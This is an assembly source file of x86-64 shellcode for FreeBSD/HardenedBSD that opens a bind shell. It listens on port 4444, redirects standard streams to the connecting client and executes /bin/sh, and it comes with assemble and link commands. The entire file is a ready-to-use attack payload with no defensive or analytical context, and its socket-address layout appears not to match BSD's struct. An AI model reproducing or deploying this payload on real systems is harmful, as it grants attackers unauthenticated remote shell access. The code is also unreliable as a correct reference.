; BSD x86-64 bind shell — listens on port 4444
; Syscall numbers for FreeBSD/HardenedBSD:
;   socket(2)=97, bind(2)=104, listen(2)=106, accept(2)=30
;   dup2(2)=90, execve(2)=59
;
; Assemble:  nasm -f elf64 shellcode.asm -o shellcode.o
; Link:      ld -o shellcode shellcode.o

section .text
global _start

_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor    rdx, rdx
    push   1                  ; SOCK_STREAM
    pop    rsi
    push   2                  ; AF_INET
    pop    rdi
    push   97                 ; SYS_socket
    pop    rax
    syscall
    mov    r12, rax           ; save sockfd

    ; struct sockaddr_in on stack: AF_INET(2), port 4444(0x115C), INADDR_ANY
    xor    rax, rax
    push   rax                ; sin_addr = 0.0.0.0
    push   word 0x5c11        ; port 4444 (network byte order)
    push   word 2             ; AF_INET
    mov    rsi, rsp           ; rsi = &sockaddr
    push   16
    pop    rdx                ; addrlen = 16

    ; bind(sockfd, &addr, 16)
    mov    rdi, r12
    push   104                ; SYS_bind
    pop    rax
    syscall

    ; listen(sockfd, 2)
    push   2
    pop    rsi
    mov    rdi, r12
    push   106                ; SYS_listen
    pop    rax
    syscall

    ; accept(sockfd, NULL, NULL)
    xor    rdx, rdx
    xor    rsi, rsi
    mov    rdi, r12
    push   30                 ; SYS_accept
    pop    rax
    syscall
    mov    r13, rax           ; save client fd

    ; dup2(clientfd, 0/1/2)
    xor    rsi, rsi
.dup_loop:
    mov    rdi, r13
    push   90                 ; SYS_dup2
    pop    rax
    syscall
    inc    rsi
    cmp    rsi, 3
    jne    .dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor    rdx, rdx
    xor    rsi, rsi
    push   rdx
    mov    rax, 0x68732f6e69622f
    push   rax
    mov    rdi, rsp
    xor    rax, rax
    mov    al, 59
    syscall
